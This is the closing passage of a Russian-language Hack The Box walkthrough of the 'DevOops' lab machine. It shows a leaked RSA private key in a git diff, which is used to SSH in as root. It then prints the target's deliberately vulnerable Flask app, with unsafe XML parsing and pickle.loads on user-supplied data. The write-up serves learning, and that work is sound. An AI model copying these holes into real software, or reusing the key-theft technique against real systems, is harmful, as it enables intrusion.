-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
-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
+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
 -----END RSA PRIVATE KEY-----
+
```

SSH-ключ. Заберем на Кали и ~~попробуем авторизоваться~~ авторизуемся с ним под суперпользователем:
```text
root@kali:~# chmod 600 root.key
root@kali:~# ssh -oStrictHostKeyChecking=no -i root.key root@10.10.10.91
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Mon Mar 26 06:23:48 2018 from 192.168.57.1
root@gitter:~# whoami
root

root@gitter:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### root.txt
```text
root@gitter:~# cat /root/root.txt
d4fe1e7f????????????????????????
```

DevOops пройден :triumph:

![owned-user.png]({{ "/img/htb/boxes/devoops/owned-user.png" | relative_url }})
{: .center-image}

![owned-root.png]({{ "/img/htb/boxes/devoops/owned-root.png" | relative_url }})
{: .center-image}

![trophy.png]({{ "/img/htb/boxes/devoops/trophy.png" | relative_url }})
{: .center-image}

# Эпилог
## feed.py
Посмотрим, какие символы блочили нам захват исходников `/home/roosa/deploy/src/feed.py` целиком:
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# TODO: replace manual upload with proper integration to backend


from flask import Flask, request, redirect, url_for, send_from_directory
from werkzeug.utils import secure_filename
from werkzeug.debug import DebuggedApplication
import re
import os
import xml.sax
import cPickle as pickle
import base64

class Config(object):
  UPLOAD_FOLDER='.'

ALLOWED_EXTENSIONS = set(['xml'])
app = Flask(__name__)
app.config.from_object(Config)
app.debug=True
print(app.config)

#app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

def allowed_file(filename):
  return '.' in filename and \
    filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

class FeedParse(xml.sax.handler.ContentHandler):
  def __init__(self, object):
    self.obj = object
    self.curpath = []
  
  def startElement(self, name, attrs):
    self.chars = ""
    print name,attrs
  
  def endElement(self, name):
    if name in set(['Author','Subject','Content']):
      self.obj[name] = self.chars

  def characters(self, content):
    self.chars += content

def process_xml(filename, path):
  parser = xml.sax.make_parser()
  object = {}
  handler = FeedParse(object)
  parser.setContentHandler(handler)
  parser.parse(open(filename))
#  print object
  return " PROCESSED BLOGPOST: \r\n " + \
         " Author: " + object["Author"] + "\r\n" + \
         " Subject: " + object["Subject"] + "\r\n" + \
         " Content: " + object["Content"] + "\r\n" + \
         " URL for later reference: " + url_for('uploaded_file',filename=filename) + "\r\n" + \
         " File path: " + path

def template(fname):
  name=request.args.get('name','')
  with open(fname, 'r') as myfile:
    data=myfile.read().replace('\n', '')
  content=re.sub('\$name', name, data)
  return content


@app.route('/upload', methods=['GET', 'POST'])
def upload_file():
  if request.method == 'POST':
     # check if the post request has the file part
     if 'file' not in request.files:
        #flash('No file part')
        return redirect(request.url)
     file = request.files['file']
     # if user does not select file, browser also
     # submit a empty part without filename
     if file.filename == '':
        #flash('No selected file')
        return redirect(request.url)
     if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file.save(os.path.join(Config.UPLOAD_FOLDER, filename))
        return process_xml(filename, os.path.abspath(Config.UPLOAD_FOLDER))
        # return redirect(url_for('uploaded_file',filename=filename))
  return template('upload.html')

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    return send_from_directory(Config.UPLOAD_FOLDER,
                               filename)

@app.route("/")
def xss():
    return template('index.html')

@app.route("/feed")
def fakefeed():
   return send_from_directory(".","devsolita-snapshot.png")

@app.route("/newpost", methods=["POST"])
def newpost():
  # TODO: proper save to database, this is for testing purposes right now
  picklestr = base64.urlsafe_b64decode(request.data)
#  return picklestr
  postObj = pickle.loads(picklestr)
  return "POST RECEIVED: " + postObj['Subject']


## TODO: VERY important! DISABLED THIS IN PRODUCTION
#app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')
# TODO: Replace run-gunicorn.sh with real Linux service script
# app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')

if __name__ == "__main__":
  app.run(host='0.0.0,0', Debug=True)
```

Действительно, всему виной была эта строка:
```python
@app.route('/uploads/<filename>')
```

C `< >` в роли "плохих" символов.
